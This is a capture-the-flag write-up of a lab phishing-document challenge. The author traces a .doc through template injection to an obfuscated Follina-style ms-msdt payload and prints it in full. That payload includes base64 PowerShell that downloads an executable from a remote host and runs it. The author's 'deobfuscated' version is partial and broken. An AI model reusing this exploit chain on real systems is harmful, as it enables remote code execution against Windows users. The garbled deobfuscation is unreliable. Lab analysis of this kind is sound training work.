
CHALLENGE DESCRIPTION

Our SOC has identified numerous phishing emails coming in claiming to have a document about an upcoming round of layoffs in the company. The emails all contain a link to diagnostic.htb/layoffs.doc. The DNS for that domain has since stopped resolving, but the server is still hosting the malicious document (your [[Docker]]). Take a look and figure out what's going on.

CHALLENGE SOLUTION

well you get a [[network socket]] as a method to access the [[Docker]] container.
mine was `209.97.140.29:32368`, I ran [[nmap]] on it but quickly realized that it is not responding that it says the users clicked on a link so it should be a web server.

To confirm my assumptions without using the browser (I do not want to get hacked), I found that using [[netcat]] and write the [[HTTP]] request manually would neutralize any attempt to exploit the browser's vulnerabilities. So I did and received an 404 response on root path `GET /`

Later I figure that there might be hints in the requests so I started a packet capture with [[wireshark]] as I request the file.

```http
HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.9.13
Date: Wed, 04 Oct 2023 22:51:56 GMT
Content-Disposition: inline; filename=diagnostic.doc
Content-Type: application/msword
Content-Length: 10707
Last-Modified: Wed, 04 Oct 2023 22:51:56 GMT
Cache-Control: no-cache
ETag: "1696459916.2340229-10707-1170933542"
Date: Wed, 04 Oct 2023 22:51:56 GMT
Connection: close
```

The [[HTTP]] server header should contain what the server is running on.
Here it says [[Werkzeug]]2.1.2 with [[python3]].9.13.

the [[HTML]] header Content-Disposition is meant to tell you "hey I am sending you this file next, what about you name it diagnostice.doc"

I do not trust file extension and so should you. if you simply run file you should see that it is a zip file not a doc.

```
deadude@Ng00m4lDhuhr:$ file diagnostic.doc
diagnostic.doc: Zip archive data, at least v2.0 to extract, compression method=store
```

but again [[doc]]/[[docx]] files are actually zip files.

Running [[oletools]] to check if there were micros, yet I found non.

There is exactly 2 ways an empty [[doc]] file can be malicious, either there are macros or [[template injection]].

You can unzip the file with any tool but I unzipped it with the `unzip` command

I needed to extract urls from [[xml]] files and found the url `http://diagnostic.htb:32368/223_index_style_fancy.html!` in `word/_rel/document.xml.rels` file.

file hosted on the same server, so we download it as following.
```
deadude@Ng00m4lDhuhr:$ wget http://diagnostic.htb:32368/223_index_style_fancy.html!
```


the response to `223_index_style_fancy.html` does not any contain [[HTML]] in body but obfuscated [[JavaScript]] in the header and nothing else, and just by looking you can tell we got a malicious payload.
```js
location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'JHtmYGlsZX0gPSAoIns3fXsxfXs2fXs4fXs1fXszfXsyfXs0fXswfSItZid9LmV4ZScsJ0J7bXNEdF80c19BX3ByMCcsJ0UnLCdyLi4ucycsJzNNc19iNEQnLCdsMycsJ3RvQycsJ0hUJywnMGxfaDRuRCcpCiYoInsxfXsyfXswfXszfSItZid1ZXMnLCdJbnZva2UnLCctV2ViUmVxJywndCcpICgiezJ9ezh9ezB9ezR9ezZ9ezV9ezN9ezF9ezd9Ii1mICc6Ly9hdScsJy5odGIvMicsJ2gnLCdpYycsJ3RvJywnYWdub3N0JywnbWF0aW9uLmRpJywnL24uZXhlJywndHRwcycpIC1PdXRGaWxlICJDOlxXaW5kb3dzXFRhc2tzXCRmaWxlIgomKCgoIns1fXs2fXsyfXs4fXswfXszfXs3fXs0fXsxfSIgLWYnTDlGVGFza3NMOUYnLCdpbGUnLCdvdycsJ0wnLCdmJywnQzonLCdMOUZMOUZXaW5kJywnOUZrekgnLCdzTDlGJykpICAtQ1JlcGxBY2Una3pIJyxbY2hBcl0zNiAtQ1JlcGxBY2UoW2NoQXJdNzYrW2NoQXJdNTcrW2NoQXJdNzApLFtjaEFyXTkyKQo='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //Tm93IGZvciBhIGNoZWVyIHRoZXkgYXJlIGhlcmUsCnRyaXVtcGhhbnQhCkhlcmUgdGhleSBjb21lIHdpdGggYmFubmVycyBmbHlpbmcsCkluIHN0YWx3YXJ0IHN0ZXAgdGhleSdyZSBuaWdoaW5nLApXaXRoIHNob3V0cyBvZiB2aWN0J3J5IGNyeWluZywKV2UgaHVycmFoLCBodXJyYWgsIHdlIGdyZWV0IHlvdSBub3csCkhhaWwhCgpGYXIgd2UgdGhlaXIgcHJhaXNlcyBzaW5nCkZvciB0aGUgZ2xvcnkgYW5kIGZhbWUgdGhleSd2ZSBicm8ndCB1cwpMb3VkIGxldCB0aGUgYmVsbHMgdGhlbSByaW5nCkZvciBoZXJlIHRoZXkgY29tZSB3aXRoIGJhbm5lcnMgZmx5aW5nCkZhciB3ZSB0aGVpciBwcmFpc2VzIHRlbGwKRm9yIHRoZSBnbG9yeSBhbmQgZmFtZSB0aGV5J3ZlIGJybyd0IHVzCkxvdWQgbGV0IHRoZSBiZWxscyB0aGVtIHJpbmcKRm9yIGhlcmUgdGhleSBjb21lIHdpdGggYmFubmVycyBmbHlpbmcKSGVyZSB0aGV5IGNvbWUsIEh1cnJhaCEKCkhhaWwhIHRvIHRoZSB2aWN0b3JzIHZhbGlhbnQKSGFpbCEgdG8gdGhlIGNvbnF1J3JpbmcgaGVyb2VzCkhhaWwhIEhhaWwhIHRvIE1pY2hpZ2FuCnRoZSBsZWFkZXJzIGFuZCBiZXN0CkhhaWwhIHRvIHRoZSB2aWN0b3JzIHZhbGlhbnQKSGFpbCEgdG8gdGhlIGNvbnF1J3JpbmcgaGVyb2VzCkhhaWwhIEhhaWwhIHRvIE1pY2hpZ2FuLAp0aGUgY2hhbXBpb25zIG9mIHRoZSBXZXN0IQoKV2UgY2hlZXIgdGhlbSBhZ2FpbgpXZSBjaGVlciBhbmQgY2hlZXIgYWdhaW4KRm9yIE1pY2hpZ2FuLCB3ZSBjaGVlciBmb3IgTWljaGlnYW4KV2UgY2hlZXIgd2l0aCBtaWdodCBhbmQgbWFpbgpXZSBjaGVlciwgY2hlZXIsIGNoZWVyCldpdGggbWlnaHQgYW5kIG1haW4gd2UgY2hlZXIhCgoKSGFpbCEgdG8gdGhlIHZpY3RvcnMgdmFsaWFudApIYWlsISB0byB0aGUgY29ucXUncmluZyBoZXJvZXMKSGFpbCEgSGFpbCEgdG8gTWljaGlnYW4sCnRoZSBjaGFtcGlvbnMgb2YgdGhlIFdlc3Qh Ck5vdyBmb3IgYSBjaGVlciB0aGV5IGFyZSBoZXJlLAp0cml1bXBoYW50IQpIZXJlIHRoZXkgY29tZSB3aXRoIGJhbm5lcnMgZmx5aW5nLApJbiBzdGFsd2FydCBzdGVwIHRoZXkncmUgbmlnaGluZywKV2l0aCBzaG91dHMgb2YgdmljdCdyeSBjcnlpbmcsCldlIGh1cnJhaCwgaHVycmFoLCB3ZSBncmVldCB5b3Ugbm93LApIYWlsIQoKRmFyIHdlIHRoZWlyIHByYWlzZXMgc2luZwpGb3IgdGhlIGdsb3J5IGFuZCBmYW1lIHRoZXkndmUgYnJvJ3QgdXMKTG91ZCBsZXQgdGhlIGJlbGxzIHRoZW0gcmluZwpGb3IgaGVyZSB0aGV5IGNvbWUgd2l0aCBiYW5uZXJzIGZseWluZwpGYXIgd2UgdGhlaXIgcHJhaXNlcyB0ZWxsCkZvciB0aGUgZ2xvcnkgYW5kIGZhbWUgdGhleSd2ZSBicm8ndCB1cwpMb3VkIGxldCB0aGUgYmVsbHMgdGhlbSByaW5nCkZvciBoZXJlIHRoZXkgY29tZSB3aXRoIGJhbm5lcnMgZmx5aW5nCkhlcmUgdGhleSBjb21lLCBIdXJyYWghCgpIYWlsISB0byB0aGUgdmljdG9ycyB2YWxpYW50CkhhaWwhIHRvIHRoZSBjb25xdSdyaW5nIGhlcm9lcwpIYWlsISBIYWlsISB0byBNaWNoaWdhbgp0aGUgbGVhZGVycyBhbmQgYmVzdApIYWlsISB0byB0aGUgdmljdG9ycyB2YWxpYW50CkhhaWwhIHRvIHRoZSBjb25xdSdyaW5nIGhlcm9lcwpIYWlsISBIYWlsISB0byBNaWNoaWdhbiwKdGhlIGNoYW1waW9ucyBvZiB0aGUgV2VzdCEKCldlIGNoZWVyIHRoZW0gYWdhaW4KV2UgY2hlZXIgYW5kIGNoZWVyIGFnYWluCkZvciBNaWNoaWdhbiwgd2UgY2hlZXIgZm9yIE1pY2hpZ2FuCldlIGNoZWVyIHdpdGggbWlnaHQgYW5kIG1haW4KV2UgY2hlZXIsIGNoZWVyLCBjaGVlcgpXaXRoIG1pZ2h0IGFuZCBtYWluIHdlIGNoZWVyIQoKCkhhaWwhIHRvIHRoZSB2aWN0b3JzIHZhbGlhbnQKSGFpbCEgdG8gdGhlIGNvbnF1J3JpbmcgaGVyb2VzCkhhaWwhIEhhaWwhIHRvIE1pY2hpZ2FuLAp0aGUgY2hhbXBpb25zIG9mIHRoZSBXZXN0IQ== CgpOb3cgZm9yIGEgY2hlZXIgdGhleSBhcmUgaGVyZSwKdHJpdW1waGFudCEKSGVyZSB0aGV5IGNvbWUgd2l0aCBiYW5uZXJzIGZseWluZywKSW4gc3RhbHdhcnQgc3RlcCB0aGV5J3JlIG5pZ2hpbmcsCldpdGggc2hvdXRzIG9mIHZpY3QncnkgY3J5aW5nLApXZSBodXJyYWgsIGh1cnJhaCwgd2UgZ3JlZXQgeW91IG5vdywKSGFpbCEKCkZhciB3ZSB0aGVpciBwcmFpc2VzIHNpbmcKRm9yIHRoZSBnbG9yeSBhbmQgZmFtZSB0aGV5J3ZlIGJybyd0IHVzCkxvdWQgbGV0IHRoZSBiZWxscyB0aGVtIHJpbmcKRm9yIGhlcmUgdGhleSBjb21lIHdpdGggYmFubmVycyBmbHlpbmcKRmFyIHdlIHRoZWlyIHByYWlzZXMgdGVsbApGb3IgdGhlIGdsb3J5IGFuZCBmYW1lIHRoZXkndmUgYnJvJ3QgdXMKTG91ZCBsZXQgdGhlIGJlbGxzIHRoZW0gcmluZwpGb3IgaGVyZSB0aGV5IGNvbWUgd2l0aCBiYW5uZXJzIGZseWluZwpIZXJlIHRoZXkgY29tZSwgSHVycmFoIQoKSGFpbCEgdG8gdGhlIHZpY3RvcnMgdmFsaWFudApIYWlsISB0byB0aGUgY29ucXUncmluZyBoZXJvZXMKSGFpbCEgSGFpbCEgdG8gTWljaGlnYW4KdGhlIGxlYWRlcnMgYW5kIGJlc3QKSGFpbCEgdG8gdGhlIHZpY3RvcnMgdmFsaWFudApIYWlsISB0byB0aGUgY29ucXUncmluZyBoZXJvZXMKSGFpbCEgSGFpbCEgdG8gTWljaGlnYW4sCnRoZSBjaGFtcGlvbnMgb2YgdGhlIFdlc3QhCgpXZSBjaGVlciB0aGVtIGFnYWluCldlIGNoZWVyIGFuZCBjaGVlciBhZ2FpbgpGb3IgTWljaGlnYW4sIHdlIGNoZWVyIGZvciBNaWNoaWdhbgpXZSBjaGVlciB3aXRoIG1pZ2h0IGFuZCBtYWluCldlIGNoZWVyLCBjaGVlciwgY2hlZXIKV2l0aCBtaWdodCBhbmQgbWFpbiB3ZSBjaGVlciEKCgpIYWlsISB0byB0aGUgdmljdG9ycyB2YWxpYW50CkhhaWwhIHRvIHRoZSBjb25xdSdyaW5nIGhlcm9lcwpIYWlsISBIYWlsISB0byBNaWNoaWdhbiwKdGhlIGNoYW1waW9ucyBvZiB0aGUgV2VzdCE= SGFyayB0aGUgc291bmQgb2YgVGFyIEhlZWwgdm9pY2VzClJpbmdpbmcgY2xlYXIgYW5kIFRydWUKU2luZ2luZyBDYXJvbGluYSdzIHByYWlzZXMKU2hvdXRpbmcgTi5DLlUuCgpIYWlsIHRvIHRoZSBicmlnaHRlc3QgU3RhciBvZiBhbGwKQ2xlYXIgaXRzIHJhZGlhbmNlIHNoaW5lCkNhcm9saW5hIHByaWNlbGVzcyBnZW0sClJlY2VpdmUgYWxsIHByYWlzZXMgdGhpbmUuCgpOZWF0aCB0aGUgb2FrcyB0aHkgc29ucyBhbmQgZGF1Z2h0ZXJzCkhvbWFnZSBwYXkgdG8gdGhlZQpUaW1lIHdvcm4gd2FsbHMgZ2l2ZSBiYWNrIHRoZWlyIGVjaG8KSGFpbCB0byBVLk4uQy4KClRob3VnaCB0aGUgc3Rvcm1zIG9mIGxpZmUgYXNzYWlsIHVzClN0aWxsIG91ciBoZWFydHMgYmVhdCB0cnVlCk5hdWdodCBjYW4gYnJlYWsgdGhlIGZyaWVuZHNoaXBzIGZvcm1lZCBhdApEZWFyIG9sZCBOLkMuVS4= CkhhcmsgdGhlIHNvdW5kIG9mIFRhciBIZWVsIHZvaWNlcwpSaW5naW5nIGNsZWFyIGFuZCBUcnVlClNpbmdpbmcgQ2Fyb2xpbmEncyBwcmFpc2VzClNob3V0aW5nIE4uQy5VLgoKSGFpbCB0byB0aGUgYnJpZ2h0ZXN0IFN0YXIgb2YgYWxsCkNsZWFyIGl0cyByYWRpYW5jZSBzaGluZQpDYXJvbGluYSBwcmljZWxlc3MgZ2VtLApSZWNlaXZlIGFsbCBwcmFpc2VzIHRoaW5lLgoKTmVhdGggdGhlIG9ha3MgdGh5IHNvbnMgYW5kIGRhdWdodGVycwpIb21hZ2UgcGF5IHRvIHRoZWUKVGltZSB3b3JuIHdhbGxzIGdpdmUgYmFjayB0aGVpciBlY2hvCkhhaWwgdG8gVS5OLkMuCgpUaG91Z2ggdGhlIHN0b3JtcyBvZiBsaWZlIGFzc2FpbCB1cwpTdGlsbCBvdXIgaGVhcnRzIGJlYXQgdHJ1ZQpOYXVnaHQgY2FuIGJyZWFrIHRoZSBmcmllbmRzaGlwcyBmb3JtZWQgYXQKRGVhciBvbGQgTi5DLlUu

```


deobfuscated JS code
```js
let code = 'location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression(\'[System.Text.Encoding]::${f`ile} = ("{7}{1}{6}{8}{5}{3}{2}{4{0}"f\'}.exe\',\'B{msDt_4s_A_pr0\',\'E\',\'r...s\',\'3Ms_b4D\',\'l3\',\'toC\',\'HT\',\'0l_h4nD\')
'

location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]::UTF8.GetString('+code+'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; 

/*
Now for a cheer they are here,
triumphant!
Here they come with banners flying,
In stalwart step they're nighing,
With shouts of vict'ry crying,
We hurrah, hurrah, we greet you now,
Hail!

Far we their praises sing
For the glory and fame they've bro't us
Loud let the bells them ring
For here they come with banners flying
Far we their praises tell
For the glory and fame they've bro't us
Loud let the bells them ring
For here they come with banners flying
Here they come, Hurrah!

Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan
the leaders and best
Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan,
the champions of the West!

We cheer them again
We cheer and cheer again
For Michigan, we cheer for Michigan
We cheer with might and main
We cheer, cheer, cheer
With might and main we cheer!


Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan,
the champions of the West!
Now for a cheer they are here,
triumphant!
Here they come with banners flying,
In stalwart step they're nighing,
With shouts of vict'ry crying,
We hurrah, hurrah, we greet you now,
Hail!

Far we their praises sing
For the glory and fame they've bro't us
Loud let the bells them ring
For here they come with banners flying
Far we their praises tell
For the glory and fame they've bro't us
Loud let the bells them ring
For here they come with banners flying
Here they come, Hurrah!

Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan
the leaders and best
Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan,
the champions of the West!

We cheer them again
We cheer and cheer again
For Michigan, we cheer for Michigan
We cheer with might and main
We cheer, cheer, cheer
With might and main we cheer!


Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan,
the champions of the West!

Now for a cheer they are here,
triumphant!
Here they come with banners flying,
In stalwart step they're nighing,
With shouts of vict'ry crying,
We hurrah, hurrah, we greet you now,
Hail!

Far we their praises sing
For the glory and fame they've bro't us
Loud let the bells them ring
For here they come with banners flying
Far we their praises tell
For the glory and fame they've bro't us
Loud let the bells them ring
For here they come with banners flying
Here they come, Hurrah!

Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan
the leaders and best
Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan,
the champions of the West!

We cheer them again
We cheer and cheer again
For Michigan, we cheer for Michigan
We cheer with might and main
We cheer, cheer, cheer
With might and main we cheer!


Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan,
the champions of the West!Hark the sound of Tar Heel voices
Ringing clear and True
Singing Carolina's praises
Shouting N.C.U.

Hail to the brightest Star of all
Clear its radiance shine
Carolina priceless gem,
Receive all praises thine.

Neath the oaks thy sons and daughters
Homage pay to thee
Time worn walls give back their echo
Hail to U.N.C.

Though the storms of life assail us
Still our hearts beat true
Naught can break the friendships formed at
Dear old N.C.U.
Hark the sound of Tar Heel voices
Ringing clear and True
Singing Carolina's praises
Shouting N.C.U.

Hail to the brightest Star of all
Clear its radiance shine
Carolina priceless gem,
Receive all praises thine.

Neath the oaks thy sons and daughters
Homage pay to thee
Time worn walls give back their echo
Hail to U.N.C.

Though the storms of life assail us
Still our hearts beat true
Naught can break the friendships formed at
Dear old N.C.U.
*/
```

with a little focus you can tell that the song is ![[Michigan's "(Hail to) The Victors](https://www.youtube.com/watch?v=mURDwg_wilE) 

You can also notice the flag being up there but not in order.
yet the order can be seen there too!

Enjoy the music while you collect it.
<details>
<summary>Re-ordering the flag</summary>
	{0} = `}`
	 {1} =`B{msDt_4s_A_pr0`
	 {2} = `E`
	 {3} = `r...s`
	 {4} = `3Ms_b4D`
	 {5} = `l3`
	 {6} = `toC`
	 {7} = `HT`
	 {8} = `0l_h4nD`
	{7}{1}{6}{8}{5}{3}{2}{4}{0} = `HTB{msDt_4s_A_pr0toC0l_h4nDl3r...sE3Ms_b4D}`
</details>
